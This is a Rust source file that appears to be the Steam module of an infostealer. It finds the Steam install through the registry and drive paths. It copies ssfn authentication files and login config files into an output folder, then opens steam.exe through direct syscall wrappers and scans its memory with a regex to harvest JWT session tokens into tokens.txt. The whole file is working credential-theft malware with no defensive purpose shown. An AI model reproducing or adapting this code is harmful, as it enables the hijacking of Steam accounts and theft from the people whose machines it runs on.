use std::path::{Path, PathBuf};
use std::fs;

#[cfg(target_os = "windows")]
use winreg::enums::*;
#[cfg(target_os = "windows")]
use winreg::RegKey;

#[derive(Default)]
pub struct SteamStats {
    pub files_extracted: usize,
    pub tokens_found: usize,
}

#[cfg(target_os = "windows")]
fn g_steam_path() -> Option<PathBuf> {
    if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey("Software\\Valve\\Steam") {
        if let Ok(path_str) = hkcu.get_value::<String, _>("SteamPath") {
            let p = PathBuf::from(path_str.replace("/", "\\"));
            if p.exists() {
                return Some(p);
            }
        }
    }

    let common_paths = vec![
        "C:\\Program Files (x86)\\Steam".to_string(),
        "C:\\Program Files\\Steam".to_string(),
    ];

    for p in common_paths {
        let pb = PathBuf::from(p);
        if pb.exists() {
            return Some(pb);
        }
    }

    for drive in b'D'..=b'Z' {
        let drive_char = drive as char;
        let path_str = format!("{}:\\Program Files (x86)\\Steam", drive_char);
        let pb = PathBuf::from(path_str);
        if pb.exists() {
            return Some(pb);
        }
    }

    None
}

pub fn extract(output_dir: &Path) -> SteamStats {
    let mut stats = SteamStats::default();
    
    let steam_path = match g_steam_path() {
        Some(p) => p,
        None => return stats,
    };

    let dest_dir = output_dir.join("GameSessions").join("Steam");
    fs::create_dir_all(&dest_dir).ok();

    if let Ok(entries) = fs::read_dir(&steam_path) {
        for entry in entries.flatten() {
            if let Ok(ft) = entry.file_type() {
                if ft.is_file() {
                    let fname = entry.file_name().to_string_lossy().to_string();
                    if fname.starts_with("ssfn") {
                        if let Ok(_) = fs::copy(entry.path(), dest_dir.join(&fname)) {
                            stats.files_extracted += 1;
                        }
                    }
                }
            }
        }
    }

    let config_path = steam_path.join("config");
    let dest_config = dest_dir.join("config");
    if config_path.exists() {
        fs::create_dir_all(&dest_config).ok();
        let targets = vec![
            "loginusers.vdf".to_string(),
            "config.vdf".to_string(),
            "DialogConfig.vdf".to_string(),
            "steamAppData.vdf".to_string()
        ];
        
        for target in targets {
            let src = config_path.join(&target);
            if src.exists() {
                if let Ok(_) = fs::copy(&src, dest_config.join(&target)) {
                    stats.files_extracted += 1;
                }
            }
        }

        if let Ok(entries) = fs::read_dir(&config_path) {
            for entry in entries.flatten() {
                let fname = entry.file_name().to_string_lossy().to_string();
                if fname.contains("loginusers") {
                     let _ = fs::copy(entry.path(), dest_config.join(&fname));
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        if let Some(tokens) = d_steam_memory() {
            if !tokens.is_empty() {
                stats.tokens_found = tokens.len();
                let token_file = dest_dir.join("tokens.txt");
                use std::io::Write;
                if let Ok(mut f) = fs::File::create(token_file) {
                    for t in tokens {
                        writeln!(f, "{}", t).ok();
                    }
                }
            }
        }
    }

    stats
}

#[cfg(target_os = "windows")]
fn d_steam_memory() -> Option<Vec<String>> {
    use windows::Win32::System::Diagnostics::ToolHelp::*;
    use windows::Win32::Foundation::{HANDLE, CloseHandle};
    use regex_lite::Regex;
    use kurion_sys::internal_api::{
        n_open_process_syscall, n_read_virtual_memory_syscall, n_query_virtual_memory_syscall,
        CLIENT_ID, OBJECT_ATTRIBUTES
    };
    use std::ptr;
    use std::ffi::c_void;

    unsafe {
        let mut process_id = 0;
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
        
        let mut entry = PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        if Process32First(snapshot, &mut entry).is_ok() {
            loop {
                let name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8).to_string_lossy();
                if name.eq_ignore_ascii_case("steam.exe") {
                    process_id = entry.th32ProcessID;
                    break;
                }
                if Process32Next(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snapshot);

        if process_id == 0 {
            return None;
        }

        let mut h_process = HANDLE(0 as *mut _);
        let mut client_id = CLIENT_ID {
            unique_process: HANDLE(process_id as *mut _),
            unique_thread: HANDLE(0 as *mut _),
        };
        let mut oa = OBJECT_ATTRIBUTES {
            length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            root_directory: HANDLE(0 as *mut _),
            object_name: ptr::null_mut(),
            attributes: 0,
            security_descriptor: ptr::null_mut(),
            security_quality_of_service: ptr::null_mut(),
        };

        let desired_access = 0x0410; 
        
        let status = n_open_process_syscall(
            &mut h_process,
            desired_access,
            &mut oa,
            &mut client_id as *mut _ as *mut c_void
        );

        if status.0 != 0 || h_process.is_invalid() {
            return None;
        }

        let mut tokens = Vec::new();
        let re = Regex::new(r"eyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0[0-9a-zA-Z\.\-_]+").ok()?;

        let mut address: usize = 0;
        
        use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION as WinMBI;
        let mut mbi = WinMBI::default();
        
        loop {
            let mut return_len = 0;
            let status = n_query_virtual_memory_syscall(
                h_process,
                address as *mut c_void,
                0,
                &mut mbi as *mut _ as *mut c_void,
                std::mem::size_of::<WinMBI>(),
                &mut return_len
            );

            if status.0 != 0 {
                break;
            }

            if mbi.State.0 == 0x1000 && (mbi.Protect.0 & 0x04) == 0x04 {
                 let mut buffer = vec![0u8; mbi.RegionSize];
                 let mut bytes_read = 0;
                 
                 let read_status = n_read_virtual_memory_syscall(
                     h_process,
                     mbi.BaseAddress,
                     buffer.as_mut_ptr() as *mut c_void,
                     mbi.RegionSize,
                     &mut bytes_read
                 );

                 if read_status.0 == 0 {
                      let s = String::from_utf8_lossy(&buffer);
                      for cap in re.captures_iter(&s) {
                          if let Some(m) = cap.get(0) {
                              let token = m.as_str().to_string();
                              if !tokens.contains(&token) {
                                  tokens.push(token);
                              }
                          }
                      }
                 }
            }
            
            let next_addr = (mbi.BaseAddress as usize) + mbi.RegionSize;
            if next_addr <= address { break; }
            address = next_addr;
        }
        
        let _ = kurion_sys::internal_api::n_close_syscall(h_process.0);
        Some(tokens)
    }
}
